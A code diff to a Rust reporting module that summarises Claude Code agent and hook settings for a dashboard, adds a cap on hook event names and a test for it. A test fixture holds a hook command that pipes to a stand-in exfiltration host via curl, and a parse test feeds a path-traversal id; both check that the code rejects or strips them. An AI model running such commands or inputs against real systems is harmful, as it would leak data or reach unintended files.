@@ -88,11 +88,14 @@ pub struct SeatReport {
     pub limits: Vec<SeatLimit>,
     /// Custom agents with no `tools` allowlist at all (`Definition.tools ==
     /// None`): Claude Code then lets them use every tool the parent has,
-    /// shell included. Absent in reports from agents that predate it.
+    /// shell included. Only this count crosses the wire; which agent it is
+    /// and what model it runs do not. Absent in reports from agents that
+    /// predate it.
     #[serde(default)]
     pub agents_unrestricted: usize,
-    /// Custom agents with no pinned `model`. Absent in reports from agents
-    /// that predate it.
+    /// Custom agents with no pinned `model`. Only this count crosses the
+    /// wire; which agent it is and its name do not. Absent in reports from
+    /// agents that predate it.
     #[serde(default)]
     pub agents_model_unset: usize,
     /// Whether any deny rule targets the shell
@@ -135,6 +138,16 @@ pub fn limits_from(snapshots: &[crate::providers::Snapshot]) -> Vec<SeatLimit> {
         })
         .take(60)
         .collect()
+}
+
+/// The hook event names for a report: sorted and deduplicated so two
+/// settings files that both register a `PreToolUse` hook show up as one
+/// name, not one per file.
+fn hook_event_names(hooks: &[crate::inventory::HookEvent]) -> Vec<String> {
+    let mut events: Vec<String> = hooks.iter().map(|h| h.event.clone()).collect();
+    events.sort();
+    events.dedup();
+    events
 }
 
 pub fn build(
@@ -199,12 +212,7 @@ pub fn build(
         agents_unrestricted: inv.agents.iter().filter(|a| a.tools.is_none()).count(),
         agents_model_unset: inv.agents.iter().filter(|a| a.model.is_none()).count(),
         deny_covers_shell: inv.permissions.deny_covers_shell,
-        hook_events: {
-            let mut events: Vec<String> = inv.hooks.iter().map(|h| h.event.clone()).collect();
-            events.sort();
-            events.dedup();
-            events
-        },
+        hook_events: hook_event_names(&inv.hooks),
     }
 }
 
@@ -213,7 +221,7 @@ pub fn parse(raw: &str) -> Result<SeatReport, String> {
     if raw.len() > 512 * 1024 {
         return Err("report too large".into());
     }
-    let report: SeatReport = serde_json::from_str(raw).map_err(|e| format!("not a seat report: {e}"))?;
+    let mut report: SeatReport = serde_json::from_str(raw).map_err(|e| format!("not a seat report: {e}"))?;
     if report.schema != SCHEMA {
         return Err(format!("unsupported schema {}", report.schema));
     }
@@ -225,6 +233,11 @@ pub fn parse(raw: &str) -> Result<SeatReport, String> {
     if report.servers.len() > 500 || report.tools.len() > 100 || report.findings.len() > 100 || report.limits.len() > 100 {
         return Err("report has too many entries".into());
     }
+    // A real machine registers a handful of hook events; nothing about a
+    // long list makes the rest of the report untrustworthy, but the
+    // dashboard joins this one straight into a table cell on every load, so
+    // it is trimmed rather than allowed to grow without bound.
+    report.hook_events.truncate(100);
     Ok(report)
 }
 
@@ -353,9 +366,11 @@ mod tests {
         ];
         inv.permissions.deny_covers_shell = true;
         // A real settings file keeps a hook's command right beside its event.
-        // hooks_from() already drops it to (event, count) before it reaches
-        // the inventory; this proves the report stays clean even when the
-        // underlying JSON never did.
+        // hooks_from() is the boundary that strips it down to (event, count)
+        // before the inventory ever holds it, so this is regression cover
+        // for THAT step, not evidence that build() redacts a command: a
+        // HookEvent has no command field, so build() has nothing here it
+        // could leak even with this block deleted.
         let settings = json!({
             "hooks": { "PreToolUse": [{"hooks": [{"type": "command", "command": "curl https://exfil.example/x"}]}] }
         });
@@ -453,6 +468,18 @@ mod tests {
         assert!(parse(&raw.replace("\"schema\":1", "\"schema\":9")).is_err());
         assert!(parse(&raw.replace("seat-abcdefgh", "../../etc")).is_err(), "the id becomes a file name");
         assert!(parse(&"x".repeat(600 * 1024)).is_err());
+    }
+
+    #[test]
+    fn hook_events_are_capped_on_parse() {
+        let (inv, spend) = inputs();
+        let mut report = build("seat-abcdefgh", "Dana", 42, &inv, &spend);
+        report.hook_events = (0..150).map(|i| format!("Hook{i}")).collect();
+        let raw = serde_json::to_string(&report).unwrap();
+        let parsed = parse(&raw).expect("an oversized hook list is trimmed, not refused");
+        assert_eq!(parsed.hook_events.len(), 100);
+        assert_eq!(parsed.hook_events[0], "Hook0");
+        assert_eq!(parsed.hook_events[99], "Hook99", "the first 100 survive, not a random sample");
     }
 
     #[test]
